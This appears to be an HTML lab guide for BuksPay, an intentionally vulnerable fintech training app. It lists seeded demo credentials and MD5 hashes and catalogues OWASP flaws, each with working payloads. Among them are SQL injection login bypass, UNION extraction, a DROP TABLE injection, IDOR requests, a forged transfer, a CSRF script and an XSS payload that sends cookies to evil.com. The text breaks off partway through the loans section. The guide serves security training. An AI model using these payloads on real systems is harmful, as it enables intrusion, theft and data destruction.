@@ -1,0 +1,1061 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>BuksPay — Security Lab Guide</title>
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,400;0,9..144,600;1,9..144,400&family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --ink:       #111110;
+    --ink-2:     #4B4B47;
+    --ink-3:     #909088;
+    --page:      #FAFAF8;
+    --surface:   #FFFFFF;
+    --border:    #E2E1DC;
+    --accent:    #1347E8;
+    --danger:    #C0392B;
+    --amber:     #92600A;
+    --amber-bg:  #FFFBF5;
+    --green:     #0B7B55;
+    --green-bg:  #EDFBF4;
+    --code-bg:   #0D1117;
+    --code-text: #E6EDF3;
+    --code-green:#3FB950;
+    --code-amber:#F0883E;
+    --code-blue: #79C0FF;
+    --code-dim:  #586069;
+  }
+
+  html { font-size: 15px; }
+
+  body {
+    background: var(--page);
+    color: var(--ink);
+    font-family: 'DM Sans', system-ui, sans-serif;
+    line-height: 1.6;
+    -webkit-font-smoothing: antialiased;
+    padding: 0;
+  }
+
+  /* ── Cover ─────────────────────────────────── */
+  .cover {
+    background: #0A1628;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    padding: 64px;
+    page-break-after: always;
+  }
+  .cover-logo {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: auto;
+  }
+  .cover-logo-mark {
+    width: 40px; height: 40px;
+    background: #1347E8;
+    border-radius: 10px;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .cover-logo-name {
+    font-family: 'Fraunces', serif;
+    font-size: 24px;
+    font-weight: 600;
+    color: #fff;
+  }
+  .cover-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    padding: 6px 14px;
+    background: rgba(19,71,232,0.15);
+    border: 1px solid rgba(19,71,232,0.4);
+    border-radius: 99px;
+    font-size: 12px;
+    font-weight: 500;
+    color: #79C0FF;
+    margin-bottom: 28px;
+    width: fit-content;
+  }
+  .cover-title {
+    font-family: 'Fraunces', serif;
+    font-size: 72px;
+    font-weight: 400;
+    font-style: italic;
+    color: #F8FAFC;
+    line-height: 1.05;
+    letter-spacing: -1.5px;
+    margin-bottom: 24px;
+    max-width: 700px;
+  }
+  .cover-title em { color: #60A5FA; font-style: normal; }
+  .cover-subtitle {
+    font-size: 18px;
+    color: #64748B;
+    max-width: 500px;
+    line-height: 1.7;
+    margin-bottom: 64px;
+  }
+  .cover-tags {
+    display: flex;
+    gap: 12px;
+    flex-wrap: wrap;
+    margin-bottom: auto;
+  }
+  .cover-tag {
+    padding: 6px 14px;
+    border: 1px solid #1E293B;
+    border-radius: 6px;
+    font-size: 12px;
+    font-weight: 500;
+    color: #475569;
+    font-family: 'JetBrains Mono', monospace;
+  }
+  .cover-footer {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding-top: 40px;
+    border-top: 1px solid #1E293B;
+    font-size: 13px;
+    color: #334155;
+  }
+
+  /* ── Layout ───────────────────────────────── */
+  .page {
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 80px 64px;
+  }
+
+  /* ── Section headings ─────────────────────── */
+  .section-eyebrow {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 0.12em;
+    color: var(--accent);
+    margin-bottom: 8px;
+  }
+  .section-title {
+    font-family: 'Fraunces', serif;
+    font-size: 36px;
+    font-weight: 400;
+    color: var(--ink);
+    letter-spacing: -0.5px;
+    margin-bottom: 8px;
+  }
+  .section-desc {
+    font-size: 15px;
+    color: var(--ink-2);
+    max-width: 560px;
+    line-height: 1.7;
+    margin-bottom: 40px;
+  }
+  .section-divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 64px 0;
+  }
+
+  /* ── Credentials table ────────────────────── */
+  .cred-grid {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 16px;
+    margin-bottom: 32px;
+  }
+  .cred-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 20px 24px;
+    position: relative;
+    overflow: hidden;
+  }
+  .cred-card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 3px;
+  }
+  .cred-card.user::before  { background: #1347E8; }
+  .cred-card.admin::before { background: #C0392B; }
+  .cred-role {
+    display: inline-flex;
+    align-items: center;
+    padding: 2px 9px;
+    border-radius: 99px;
+    font-size: 10px;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    margin-bottom: 14px;
+  }
+  .cred-role.user  { background: #EBF0FF; color: #1347E8; }
+  .cred-role.admin { background: #FEF2F2; color: #C0392B; }
+  .cred-row {
+    display: flex;
+    align-items: baseline;
+    gap: 12px;
+    margin-bottom: 8px;
+  }
+  .cred-label {
+    font-size: 11px;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    color: var(--ink-3);
+    min-width: 72px;
+  }
+  .cred-value {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 14px;
+    color: var(--ink);
+  }
+  .cred-hash {
+    margin-top: 12px;
+    padding: 8px 12px;
+    background: #FEF2F2;
+    border-radius: 6px;
+  }
+  .cred-hash-label {
+    font-size: 10px;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    color: var(--danger);
+    margin-bottom: 4px;
+  }
+  .cred-hash-value {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    color: #7F1D1D;
+    word-break: break-all;
+  }
+
+  /* ── Vuln sections ───────────────────────── */
+  .vuln-block {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 14px;
+    overflow: hidden;
+    margin-bottom: 28px;
+    page-break-inside: avoid;
+  }
+  .vuln-header {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    padding: 20px 24px;
+    border-bottom: 1px solid var(--border);
+    background: #FAFAF8;
+  }
+  .vuln-feature {
+    font-size: 16px;
+    font-weight: 600;
+    color: var(--ink);
+  }
+  .vuln-tags {
+    display: flex;
+    gap: 6px;
+    margin-left: auto;
+    flex-wrap: wrap;
+  }
+  .vuln-tag-pill {
+    padding: 3px 9px;
+    border-radius: 6px;
+    font-size: 11px;
+    font-weight: 600;
+    font-family: 'JetBrains Mono', monospace;
+    border: 1px solid;
+  }
+  .tag-a01 { background: #FEF2F2; color: #991B1B; border-color: #FECACA; }
+  .tag-a02 { background: #FFFBEB; color: #92400E; border-color: #FDE68A; }
+  .tag-a03 { background: #EFF6FF; color: #1E40AF; border-color: #BFDBFE; }
+  .tag-a05 { background: #F5F3FF; color: #5B21B6; border-color: #DDD6FE; }
+  .tag-a07 { background: #FFF7ED; color: #9A3412; border-color: #FED7AA; }
+
+  .vuln-body { padding: 20px 24px; }
+
+  .vuln-item {
+    display: grid;
+    grid-template-columns: 140px 1fr;
+    gap: 0 24px;
+    padding: 14px 0;
+    border-bottom: 1px solid #F3F2EF;
+  }
+  .vuln-item:last-child { border-bottom: none; }
+
+  .vuln-item-label {
+    font-size: 12px;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 0.07em;
+    color: var(--ink-3);
+    padding-top: 1px;
+  }
+  .vuln-item-content { font-size: 14px; color: var(--ink-2); line-height: 1.6; }
+  .vuln-item-content strong { color: var(--ink); font-weight: 600; }
+
+  /* ── Code / payload blocks ────────────────── */
+  .code-block {
+    background: var(--code-bg);
+    border-radius: 8px;
+    padding: 14px 16px;
+    margin: 10px 0 6px;
+    overflow-x: auto;
+  }
+  .code-block code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 13px;
+    color: var(--code-text);
+    white-space: pre;
+  }
+  .code-block code .g { color: var(--code-green); }
+  .code-block code .a { color: var(--code-amber); }
+  .code-block code .b { color: var(--code-blue); }
+  .code-block code .d { color: var(--code-dim); }
+  .code-block code .r { color: #FF7B72; }
+
+  /* ── Cheatsheet table ─────────────────────── */
+  .cheat-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 13.5px;
+  }
+  .cheat-table thead tr {
+    background: #0A1628;
+    color: #fff;
+  }
+  .cheat-table th {
+    padding: 12px 16px;
+    text-align: left;
+    font-size: 11px;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    color: #94A3B8;
+  }
+  .cheat-table th:first-child { border-radius: 8px 0 0 0; }
+  .cheat-table th:last-child  { border-radius: 0 8px 0 0; }
+  .cheat-table tbody tr { border-bottom: 1px solid var(--border); }
+  .cheat-table tbody tr:last-child { border-bottom: none; }
+  .cheat-table tbody tr:nth-child(even) td { background: #FAFAF8; }
+  .cheat-table td { padding: 12px 16px; vertical-align: top; }
+  .cheat-table td:first-child { font-family: 'JetBrains Mono', monospace; font-size: 12px; }
+
+  .cheat-wrap {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    overflow: hidden;
+  }
+
+  /* ── Info box ─────────────────────────────── */
+  .info-box {
+    padding: 16px 20px;
+    border-radius: 10px;
+    font-size: 14px;
+    line-height: 1.6;
+    margin-bottom: 20px;
+    display: flex;
+    gap: 12px;
+  }
+  .info-box.warning {
+    background: var(--amber-bg);
+    border: 1px solid #FDE68A;
+    color: var(--amber);
+  }
+  .info-box.info {
+    background: #EFF6FF;
+    border: 1px solid #BFDBFE;
+    color: #1E40AF;
+  }
+
+  /* ── Print ────────────────────────────────── */
+  @media print {
+    body { background: white; }
+    .cover { min-height: auto; padding: 48px; }
+    .cover-title { font-size: 52px; }
+    .page { padding: 48px; }
+    .section-divider { margin: 48px 0; }
+  }
+
+  @page {
+    size: A4;
+    margin: 0;
+  }
+</style>
+</head>
+<body>
+
+<!-- ══ COVER ══════════════════════════════════════ -->
+<div class="cover">
+  <div class="cover-logo">
+    <div class="cover-logo-mark">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+        <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+    </div>
+    <span class="cover-logo-name">BuksPay</span>
+  </div>
+
+  <div style="margin: auto 0;">
+    <div class="cover-badge">
+      <span style="width:7px;height:7px;border-radius:50%;background:#3B82F6;display:inline-block;"></span>
+      Security Lab · Educational Use Only
+    </div>
+
+    <h1 class="cover-title">
+      Lab Guide &amp;<br>
+      <em>Attack Reference</em>
+    </h1>
+
+    <p class="cover-subtitle">
+      Complete credentials, vulnerability catalogue, and step-by-step attack payloads for the BuksPay intentionally vulnerable fintech application.
+    </p>
+
+    <div class="cover-tags">
+      <span class="cover-tag">OWASP Top 10</span>
+      <span class="cover-tag">A01 · Broken Access Control</span>
+      <span class="cover-tag">A02 · Cryptographic Failures</span>
+      <span class="cover-tag">A03 · Injection</span>
+      <span class="cover-tag">A05 · Security Misconfiguration</span>
+      <span class="cover-tag">A07 · Auth Failures</span>
+    </div>
+  </div>
+
+  <div class="cover-footer">
+    <span>BuksPay Security Lab — For Educational Use Only</span>
+    <span style="font-family:'JetBrains Mono',monospace;font-size:12px;">v1.0 · 2026</span>
+  </div>
+</div>
+
+<!-- ══ MAIN CONTENT ═══════════════════════════════ -->
+<div class="page">
+
+  <!-- ── 1. DEMO CREDENTIALS ──────────────────── -->
+  <div class="section-eyebrow">Section 01</div>
+  <h2 class="section-title">Demo Credentials</h2>
+  <p class="section-desc">
+    Four pre-seeded accounts across two privilege levels. Passwords are stored as unsalted MD5 hashes — crackable in under a second on any rainbow table.
+  </p>
+
+  <div class="info-box warning">
+    <span>⚠</span>
+    <span><strong>A02 Cryptographic Failure:</strong> All passwords use MD5 with no salt. The hashes below can be reversed instantly using any online MD5 lookup (e.g. crackstation.net).</span>
+  </div>
+
+  <div class="cred-grid">
+
+    <div class="cred-card user">
+      <span class="cred-role user">Regular User</span>
+      <div class="cred-row">
+        <span class="cred-label">Username</span>
+        <span class="cred-value">alice</span>
+      </div>
+      <div class="cred-row">
+        <span class="cred-label">Password</span>
+        <span class="cred-value">password123</span>
+      </div>
+      <div class="cred-row">
+        <span class="cred-label">Account</span>
+        <span class="cred-value">BUK-0001</span>
+      </div>
+      <div class="cred-row">
+        <span class="cred-label">Balance</span>
+        <span class="cred-value">₦15,000.00</span>
+      </div>
+      <div class="cred-row">
+        <span class="cred-label">User ID</span>
+        <span class="cred-value">1</span>
+      </div>
+      <div class="cred-hash">
+        <div class="cred-hash-label">MD5 Hash</div>
+        <div class="cred-hash-value">482c811da5d5b4bc6d497ffa98491e38</div>
+      </div>
+    </div>
+
+    <div class="cred-card user">
+      <span class="cred-role user">Regular User</span>
+      <div class="cred-row">
+        <span class="cred-label">Username</span>
+        <span class="cred-value">bob</span>
+      </div>
+      <div class="cred-row">
+        <span class="cred-label">Password</span>
+        <span class="cred-value">letmein</span>
+      </div>
+      <div class="cred-row">
+        <span class="cred-label">Account</span>
+        <span class="cred-value">BUK-0002</span>
+      </div>
+      <div class="cred-row">
+        <span class="cred-label">Balance</span>
+        <span class="cred-value">₦8,500.00</span>
+      </div>
+      <div class="cred-row">
+        <span class="cred-label">User ID</span>
+        <span class="cred-value">2</span>
+      </div>
+      <div class="cred-hash">
+        <div class="cred-hash-label">MD5 Hash</div>
+        <div class="cred-hash-value">0d107d09f5bbe40cade3de5c71e9e9b7</div>
+      </div>
+    </div>
+
+    <div class="cred-card user">
+      <span class="cred-role user">Regular User</span>
+      <div class="cred-row">
+        <span class="cred-label">Username</span>
+        <span class="cred-value">charlie</span>
+      </div>
+      <div class="cred-row">
+        <span class="cred-label">Password</span>
+        <span class="cred-value">charlie123</span>
+      </div>
+      <div class="cred-row">
+        <span class="cred-label">Account</span>
+        <span class="cred-value">BUK-0003</span>
+      </div>
+      <div class="cred-row">
+        <span class="cred-label">Balance</span>
+        <span class="cred-value">₦3,200.00</span>
+      </div>
+      <div class="cred-row">
+        <span class="cred-label">User ID</span>
+        <span class="cred-value">3</span>
+      </div>
+      <div class="cred-hash">
+        <div class="cred-hash-label">MD5 Hash</div>
+        <div class="cred-hash-value">f1940d88490bce94c4ecfcd743b5c3aa</div>
+      </div>
+    </div>
+
+    <div class="cred-card admin">
+      <span class="cred-role admin">Administrator</span>
+      <div class="cred-row">
+        <span class="cred-label">Username</span>
+        <span class="cred-value">admin</span>
+      </div>
+      <div class="cred-row">
+        <span class="cred-label">Password</span>
+        <span class="cred-value">admin123</span>
+      </div>
+      <div class="cred-row">
+        <span class="cred-label">Account</span>
+        <span class="cred-value">BUK-ADMIN</span>
+      </div>
+      <div class="cred-row">
+        <span class="cred-label">Balance</span>
+        <span class="cred-value">₦99,999.00</span>
+      </div>
+      <div class="cred-row">
+        <span class="cred-label">User ID</span>
+        <span class="cred-value">4</span>
+      </div>
+      <div class="cred-hash">
+        <div class="cred-hash-label">MD5 Hash</div>
+        <div class="cred-hash-value">0192023a7bbd73250516f069df18b500</div>
+      </div>
+    </div>
+
+  </div>
+
+  <hr class="section-divider" />
+
+  <!-- ── 2. VULNERABILITY CATALOGUE ─────────────── -->
+  <div class="section-eyebrow">Section 02</div>
+  <h2 class="section-title">Vulnerability Catalogue</h2>
+  <p class="section-desc">
+    Each feature maps to one or more OWASP Top 10 categories. Every vulnerability is intentional and traceable to a specific line of code in the API routes.
+  </p>
+
+  <!-- Login & Registration -->
+  <div class="vuln-block">
+    <div class="vuln-header">
+      <div>
+        <div style="font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:0.08em;color:var(--ink-3);margin-bottom:3px;">Feature 01</div>
+        <div class="vuln-feature">Login &amp; Registration</div>
+      </div>
+      <div class="vuln-tags">
+        <span class="vuln-tag-pill tag-a01">A01</span>
+        <span class="vuln-tag-pill tag-a02">A02</span>
+        <span class="vuln-tag-pill tag-a03">A03</span>
+        <span class="vuln-tag-pill tag-a07">A07</span>
+      </div>
+    </div>
+    <div class="vuln-body">
+
+      <div class="vuln-item">
+        <div class="vuln-item-label">A03 · SQL Injection</div>
+        <div class="vuln-item-content">
+          <strong>Login bypass via username field.</strong> The query is built with string concatenation — injecting a comment sequence skips the password check entirely.
+          <div class="code-block"><code><span class="d">-- Payload (username field, any password)</span>
+<span class="a">alice'--</span>
+
+<span class="d">-- Resulting SQL executed on server:</span>
+<span class="g">SELECT</span> * <span class="g">FROM</span> users
+<span class="g">WHERE</span> username = <span class="a">'alice'</span><span class="r">--</span><span class="a">'</span> <span class="g">AND</span> password = <span class="a">'...'</span>
+<span class="d">-- password check is commented out ^^</span></code></div>
+          <strong>Register injection</strong> — the duplicate-check query also uses string concatenation:
+          <div class="code-block"><code><span class="d">-- username payload</span>
+<span class="a">x' UNION SELECT 1,username,email,password,0,'','','','' FROM users--</span></code></div>
+        </div>
+      </div>
+
+      <div class="vuln-item">
+        <div class="vuln-item-label">A02 · Crypto Failure</div>
+        <div class="vuln-item-content">
+          <strong>Passwords hashed with unsalted MD5.</strong> MD5 is a fast hashing function not designed for passwords. Every hash above is instantly reversible via rainbow tables.
+          <div class="code-block"><code><span class="d">// lib/db.ts — line ~30</span>
+<span class="g">const</span> md5 = (s) => createHash(<span class="a">'md5'</span>).update(s).digest(<span class="a">'hex'</span>)
+<span class="d">// Should be: bcrypt with cost factor ≥ 12</span></code></div>
+          <strong>JWT secret</strong> is hardcoded (<code style="font-family:'JetBrains Mono';font-size:12px;background:#F3F2EF;padding:1px 5px;border-radius:3px;">bukspay_secret_123</code>) in <code style="font-family:'JetBrains Mono';font-size:12px;">lib/auth.ts</code>.<br/>
+          <strong>Token cookie</strong> is set with <code style="font-family:'JetBrains Mono';font-size:12px;">httpOnly: false</code> — readable from JavaScript.
+        </div>
+      </div>
+
+      <div class="vuln-item">
+        <div class="vuln-item-label">A07 · Auth Failures</div>
+        <div class="vuln-item-content">
+          <strong>Username enumeration.</strong> Error messages distinguish between "Username not found" and "Wrong password" — attackers can enumerate valid usernames.
+          <br/><br/>
+          <strong>No rate limiting or lockout.</strong> Unlimited login attempts — brute force is unrestricted.
+          <br/><br/>
+          <strong>Tokens never expire</strong> — <code style="font-family:'JetBrains Mono';font-size:12px;">jwt.sign()</code> called with no <code style="font-family:'JetBrains Mono';font-size:12px;">expiresIn</code>.
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- Dashboard -->
+  <div class="vuln-block">
+    <div class="vuln-header">
+      <div>
+        <div style="font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:0.08em;color:var(--ink-3);margin-bottom:3px;">Feature 02</div>
+        <div class="vuln-feature">Account Dashboard</div>
+      </div>
+      <div class="vuln-tags">
+        <span class="vuln-tag-pill tag-a01">A01</span>
+        <span class="vuln-tag-pill tag-a02">A02</span>
+        <span class="vuln-tag-pill tag-a05">A05</span>
+      </div>
+    </div>
+    <div class="vuln-body">
+      <div class="vuln-item">
+        <div class="vuln-item-label">A01 · IDOR</div>
+        <div class="vuln-item-content">
+          <strong>Insecure Direct Object Reference.</strong> The <code style="font-family:'JetBrains Mono';font-size:12px;">?userId=</code> parameter is accepted from the URL with no session ownership check. Any user (or unauthenticated visitor) can view any account.
+          <div class="code-block"><code><span class="d">-- View bob's full account (logged in as alice, or not logged in)</span>
+<span class="b">GET</span> /api/dashboard?userId=<span class="a">2</span>
+<span class="b">GET</span> /dashboard?userId=<span class="a">2</span>
+
+<span class="d">-- Enumerate all users:</span>
+<span class="b">GET</span> /api/dashboard?userId=<span class="a">1</span>  → alice
+<span class="b">GET</span> /api/dashboard?userId=<span class="a">2</span>  → bob
+<span class="b">GET</span> /api/dashboard?userId=<span class="a">3</span>  → charlie
+<span class="b">GET</span> /api/dashboard?userId=<span class="a">4</span>  → admin</code></div>
+        </div>
+      </div>
+      <div class="vuln-item">
+        <div class="vuln-item-label">A02 + A05</div>
+        <div class="vuln-item-content">
+          <strong>Full row returned including password hash.</strong> The API response includes every column — email, phone, address, role, and the MD5 password hash — with no field filtering.
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Money Transfer -->
+  <div class="vuln-block">
+    <div class="vuln-header">
+      <div>
+        <div style="font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:0.08em;color:var(--ink-3);margin-bottom:3px;">Feature 03</div>
+        <div class="vuln-feature">Money Transfer</div>
+      </div>
+      <div class="vuln-tags">
+        <span class="vuln-tag-pill tag-a01">A01</span>
+        <span class="vuln-tag-pill tag-a03">A03</span>
+        <span class="vuln-tag-pill tag-a05">A05</span>
+      </div>
+    </div>
+    <div class="vuln-body">
+      <div class="vuln-item">
+        <div class="vuln-item-label">A01 · Spoofed Sender</div>
+        <div class="vuln-item-content">
+          <strong>fromUserId is trusted from the request body.</strong> Set it to any user's ID to drain their balance — no ownership verification on the server.
+          <div class="code-block"><code><span class="d">// POST /api/transfer</span>
+{
+  <span class="b">"toAccountNumber"</span>: <span class="a">"BUK-0001"</span>,  <span class="d">// your account</span>
+  <span class="b">"amount"</span>: <span class="a">15000</span>,
+  <span class="b">"fromUserId"</span>: <span class="a">"2"</span>,             <span class="d">// steal from bob (id=2)</span>
+  <span class="b">"memo"</span>: <span class="a">"transfer"</span>
+}</code></div>
+        </div>
+      </div>
+      <div class="vuln-item">
+        <div class="vuln-item-label">A03 · SQLi in Memo</div>
+        <div class="vuln-item-content">
+          <strong>Memo field concatenated into INSERT statement.</strong> Inject SQL to manipulate the transaction log.
+          <div class="code-block"><code><span class="d">// Memo payload — closes the string and injects SQL</span>
+<span class="a">payment', 99999); UPDATE users SET balance=99999 WHERE id=1;--</span></code></div>
+        </div>
+      </div>
+      <div class="vuln-item">
+        <div class="vuln-item-label">A05 · No CSRF</div>
+        <div class="vuln-item-content">
+          <strong>No CSRF token on state-changing POST.</strong> A malicious page on another origin can silently submit a transfer on behalf of any logged-in user.
+          <div class="code-block"><code><span class="d">&lt;!-- attacker's page --&gt;</span>
+<span class="r">&lt;script&gt;</span>
+  fetch(<span class="a">'https://bukspay.vercel.app/api/transfer'</span>, {
+    method: <span class="a">'POST'</span>, credentials: <span class="a">'include'</span>,
+    headers: {<span class="a">'Content-Type'</span>: <span class="a">'application/json'</span>},
+    body: JSON.stringify({ toAccountNumber: <span class="a">'BUK-ATTACKER'</span>, amount: 9999 })
+  })
+<span class="r">&lt;/script&gt;</span></code></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Beneficiaries -->
+  <div class="vuln-block">
+    <div class="vuln-header">
+      <div>
+        <div style="font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:0.08em;color:var(--ink-3);margin-bottom:3px;">Feature 04</div>
+        <div class="vuln-feature">Beneficiary Management</div>
+      </div>
+      <div class="vuln-tags">
+        <span class="vuln-tag-pill tag-a01">A01</span>
+        <span class="vuln-tag-pill tag-a03">A03</span>
+        <span class="vuln-tag-pill tag-a05">A05</span>
+      </div>
+    </div>
+    <div class="vuln-body">
+      <div class="vuln-item">
+        <div class="vuln-item-label">A01 · IDOR Read</div>
+        <div class="vuln-item-content">
+          View any user's saved beneficiaries:
+          <div class="code-block"><code><span class="b">GET</span> /api/beneficiaries?userId=<span class="a">2</span></code></div>
+        </div>
+      </div>
+      <div class="vuln-item">
+        <div class="vuln-item-label">A01 · IDOR Delete</div>
+        <div class="vuln-item-content">
+          Delete any beneficiary by ID — no ownership check. Enumerate IDs 1, 2, 3… to wipe another user's list:
+          <div class="code-block"><code><span class="b">DELETE</span> /api/beneficiaries?id=<span class="a">1</span></code></div>
+        </div>
+      </div>
+      <div class="vuln-item">
+        <div class="vuln-item-label">A03 · Search SQLi</div>
+        <div class="vuln-item-content">
+          The search parameter is injected into a LIKE clause. Union-based extraction is possible:
+          <div class="code-block"><code><span class="b">GET</span> /api/beneficiaries?userId=1&search=<span class="a">%25' UNION SELECT id,username,password,account_number,'' FROM users--</span></code></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Profile -->
+  <div class="vuln-block">
+    <div class="vuln-header">
+      <div>
+        <div style="font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:0.08em;color:var(--ink-3);margin-bottom:3px;">Feature 05</div>
+        <div class="vuln-feature">Profile Settings</div>
+      </div>
+      <div class="vuln-tags">
+        <span class="vuln-tag-pill tag-a01">A01</span>
+        <span class="vuln-tag-pill tag-a02">A02</span>
+        <span class="vuln-tag-pill tag-a07">A07</span>
+      </div>
+    </div>
+    <div class="vuln-body">
+      <div class="vuln-item">
+        <div class="vuln-item-label">A07 · No Auth to Change Password</div>
+        <div class="vuln-item-content">
+          <strong>Current password is never verified before allowing a password change.</strong> If an attacker gains brief access to a session, they can permanently lock out the real user.
+          <div class="code-block"><code><span class="d">// PUT /api/profile</span>
+{ <span class="b">"newPassword"</span>: <span class="a">"hacked123"</span>, <span class="b">"userId"</span>: <span class="a">"2"</span> }
+<span class="d">// No currentPassword field checked — changes bob's password</span></code></div>
+        </div>
+      </div>
+      <div class="vuln-item">
+        <div class="vuln-item-label">A01 · Mass Update</div>
+        <div class="vuln-item-content">
+          The <code style="font-family:'JetBrains Mono';font-size:12px;">userId</code> in the request body is trusted. Update any user's profile or change their password without logging in as them.
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Admin -->
+  <div class="vuln-block">
+    <div class="vuln-header">
+      <div>
+        <div style="font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:0.08em;color:var(--ink-3);margin-bottom:3px;">Feature 06 · ⚠ Critical</div>
+        <div class="vuln-feature">Admin Panel</div>
+      </div>
+      <div class="vuln-tags">
+        <span class="vuln-tag-pill tag-a01">A01 Critical</span>
+        <span class="vuln-tag-pill tag-a02">A02</span>
+      </div>
+    </div>
+    <div class="vuln-body">
+      <div class="vuln-item">
+        <div class="vuln-item-label">A01 · Auth Bypass</div>
+        <div class="vuln-item-content">
+          <strong>A single query parameter grants full admin access.</strong> No session, no role check — just append <code style="font-family:'JetBrains Mono';font-size:12px;">?admin=true</code> to dump every user, transaction, and loan in the database.
+          <div class="code-block"><code><span class="d">-- No cookies, no login, completely unauthenticated:</span>
+<span class="b">GET</span> /api/admin?<span class="a">admin=true</span>
+
+<span class="d">-- Returns all users with plaintext MD5 hashes,</span>
+<span class="d">-- all transactions, all loan applications</span></code></div>
+        </div>
+      </div>
+      <div class="vuln-item">
+        <div class="vuln-item-label">A01 · Unauth Actions</div>
+        <div class="vuln-item-content">
+          The admin POST endpoint has no authentication at all. Adjust any balance, promote any user to admin, or delete any account:
+          <div class="code-block"><code><span class="b">POST</span> /api/admin
+{ <span class="b">"action"</span>: <span class="a">"changeRole"</span>, <span class="b">"userId"</span>: <span class="a">"2"</span>, <span class="b">"role"</span>: <span class="a">"admin"</span> }
+
+{ <span class="b">"action"</span>: <span class="a">"adjustBalance"</span>, <span class="b">"userId"</span>: <span class="a">"1"</span>, <span class="b">"amount"</span>: <span class="a">999999</span> }
+
+{ <span class="b">"action"</span>: <span class="a">"deleteUser"</span>, <span class="b">"userId"</span>: <span class="a">"3"</span> }</code></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Transaction History -->
+  <div class="vuln-block">
+    <div class="vuln-header">
+      <div>
+        <div style="font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:0.08em;color:var(--ink-3);margin-bottom:3px;">Feature 07</div>
+        <div class="vuln-feature">Transaction History</div>
+      </div>
+      <div class="vuln-tags">
+        <span class="vuln-tag-pill tag-a01">A01</span>
+        <span class="vuln-tag-pill tag-a02">A02</span>
+        <span class="vuln-tag-pill tag-a03">A03</span>
+        <span class="vuln-tag-pill tag-a05">A05</span>
+      </div>
+    </div>
+    <div class="vuln-body">
+      <div class="vuln-item">
+        <div class="vuln-item-label">A01 · IDOR</div>
+        <div class="vuln-item-content">
+          View the full transaction history of any user without authentication:
+          <div class="code-block"><code><span class="b">GET</span> /api/transactions?userId=<span class="a">2</span>  <span class="d">→ all of bob's transactions</span></code></div>
+        </div>
+      </div>
+      <div class="vuln-item">
+        <div class="vuln-item-label">A03 · ORDER BY Injection</div>
+        <div class="vuln-item-content">
+          The <code style="font-family:'JetBrains Mono';font-size:12px;">filter</code> parameter is injected directly into the <code style="font-family:'JetBrains Mono';font-size:12px;">ORDER BY</code> clause. This can be used to extract data via boolean-based inference or trigger errors that leak schema information.
+          <div class="code-block"><code><span class="b">GET</span> /api/transactions?filter=<span class="a">(SELECT CASE WHEN (1=1) THEN amount ELSE id END)</span>
+<span class="b">GET</span> /api/transactions?filter=<span class="a">1; DROP TABLE users--</span></code></div>
+        </div>
+      </div>
+      <div class="vuln-item">
+        <div class="vuln-item-label">A03 · Stored XSS</div>
+        <div class="vuln-item-content">
+          The memo field is rendered with <code style="font-family:'JetBrains Mono';font-size:12px;">dangerouslySetInnerHTML</code> in the transactions table. Send a transfer with a script payload as the memo — it executes for any user who views their history.
+          <div class="code-block"><code><span class="d">// Memo payload in transfer form:</span>
+<span class="a">&lt;img src=x onerror="alert(document.cookie)"&gt;</span>
+<span class="a">&lt;script&gt;fetch('https://evil.com/?c='+document.cookie)&lt;/script&gt;</span></code></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Loans -->
+  <div class="vuln-block">
+    <div class="vuln-header">
+      <div>
+        <div style="font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:0.08em;color:var(--ink-3);margin-bottom:3px;">Feature 08</div>
